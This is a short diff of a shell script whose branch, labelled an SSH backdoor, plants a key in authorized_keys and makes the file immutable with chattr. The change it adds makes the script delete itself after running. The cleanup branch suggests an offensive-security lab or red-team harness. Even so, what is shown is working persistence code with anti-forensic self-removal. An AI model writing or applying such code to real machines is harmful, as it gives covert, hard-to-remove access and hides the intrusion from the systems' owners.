@@ -31,6 +31,7 @@ case "${1:-}" in
     chmod 600 "$AUTH_KEYS"
     chattr +i "$AUTH_KEYS"
     echo "[+] 02_ssh_backdoor: key planted in ${AUTH_KEYS} (immutable)"
+    rm -f -- "${BASH_SOURCE[0]}" 2>/dev/null || true
     ;;
   cleanup)
     chattr -i "$AUTH_KEYS" 2>/dev/null || true
